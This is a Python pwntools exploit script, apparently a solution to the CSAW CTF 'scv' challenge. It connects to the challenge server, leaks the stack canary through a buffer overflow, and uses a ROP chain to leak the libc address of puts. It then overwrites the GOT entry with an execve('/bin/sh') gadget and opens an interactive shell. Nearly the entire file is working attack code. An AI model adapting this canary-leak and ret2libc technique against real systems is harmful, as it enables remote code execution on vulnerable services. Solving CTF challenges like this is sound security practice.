from enum import IntEnum
from pwn import *
from os import *
from binascii import hexlify, unhexlify
from time import sleep

import string
import sys
import re

breakpoints = []

class LogLevel(IntEnum):
    NONE  = 0x0
    SEND  = 0x1
    RECV  = 0x2
    DEBUG = 0x4
    WARN  = 0x8
    ERROR = 0xf

gdbinit = """
    source /home/spowell/penetration/tool/pwndbg/gdbinit.py
    {bp}
    b execve
    c
""".format(bp="\n".join(["b *"+hex(x) for x in breakpoints]))


class Pwnable(object):

    def __init__(self, fn, argv=[], port=None, env=[]):
        if not env:
            env = environ

        context(arch='i386', os='linux', terminal=['sakura', '-x'])

        self.level = LogLevel.RECV

        self.gdbinit = gdbinit

        if port != None and isinstance(port, int):
            self.proc = remote(fn, port)
        else:
            self.proc = process(executable=fn, argv=argv, aslr=False, env=env)


    def interact(self):
        self.proc.interactive()

    def gdb(self):
        gdb.attach(self.proc, gdbinit)

    def sendline(self, s):
        s = str(s)
        self.log(s, LogLevel.SEND)
        self.proc.sendline(s)

    def recv(self, timeout=1):
        data = self.proc.recv(timeout=timeout)
        self.log(data, LogLevel.RECV)

        return data

    def recvline(self, timeout=1, n=1):
        if n > 1:
            res = []
            for _ in range(n):
                data = self.proc.recvline(timeout=timeout)
                self.log(data, LogLevel.RECV)
                res.append(data)
            return res
        else:
            data = self.proc.recvline(timeout=timeout)
            self.log(data, LogLevel.RECV)
            return data

    def recvregex(self, re, timeout=1):
        data = self.proc.recvregex(re, timeout=timeout)
        self.log(data, LogLevel.RECV)

        return data

    def recvuntil(self, until, timeout=1):
        data = self.proc.recvuntil(until, timeout=timeout)
        self.log(data, LogLevel.RECV)

        return data

    def log(self, s, t=LogLevel.DEBUG):
        if int(t) & self.level != 0:
            print s

    '''
    interaction functions
    '''

    def write(self, s):
        self.sendline(1)
        self.recvuntil(">>")
        self.sendline(s)
        try:
            self.recvuntil(">>")
        except:
            pass

    def read(self):
        self.sendline(2)
        self.recvline(n=5)
        data = self.recvuntil("\n-------------------------")
        data =   data.replace("\n-------------------------", "")
        self.recvuntil(">>")

        return data

    def exit(self):
        self.sendline(3)
        return self.recvline()

    def get_ptr(self, offset, l=8):

        # account for newline
        offset = offset - 1
        addr = ""

        while len(addr) < l:

            m.write("a"*(offset+len(addr)))
            res = m.read()[offset+1+len(addr):]

            if not res:
                addr += "\x00"
            else:
                addr += res[0]

        return u64(addr)


if __name__ == "__main__":

    #m = Pwnable("/home/spowell/penetration/csaw/scv/scv", env=environ)
    #libc = ELF("/usr/lib/libc.so.6")
    #execve_offset = 0x42010
    m = Pwnable("pwn.chal.csaw.io", port=3764)
    libc = ELF("/home/spowell/penetration/csaw/scv/libc-2.23.so")
    execve_offset = 0x4526a

    m.level = 0x00

    m.recvuntil(">>")

    # esp + 168 is the stack canary
    canary = m.get_ptr(168)
    print "[+] Found canary: " + hex(canary)

    payload = cyclic(168)
    payload += p64(canary)
    payload += "a"*8

    # start of rop chain

    # pop rbp
    payload += p64(0x400a00)
    # addr of puts + offset
    payload += p64(0x602018 + 0xb0) # rbp = 0x602018 + 0xb0
    # puts (rbp - 0xb0)
    payload += p64(0x400d6a)

    m.write(payload)

    # call return and start rop chain
    m.exit()

    # call puts(0x602018)
    # this address is the address of puts in the binary (GOT)
    puts = m.recvuntil("\n----")
    m.recv()

    puts = puts.replace("\n----","")
    puts = puts.ljust(8, '\x00')
    puts = u64(puts)
    print "[+] puts @ " + hex(puts)

    # subtract the base address of puts from the printed addres
    offset = puts - libc.symbols["puts"]

    # create the new offset
    # execve("/bin/sh")
    # in do_system function from libc
    execve = offset + execve_offset

    print "[+] execve @ GOT + " + hex(execve)

    # write address of execve("/bin/sh") to puts
    m.write(p64(execve))

    # call puts
    m.sendline(2)
    m.recv()

    # shell popped
    m.interact()

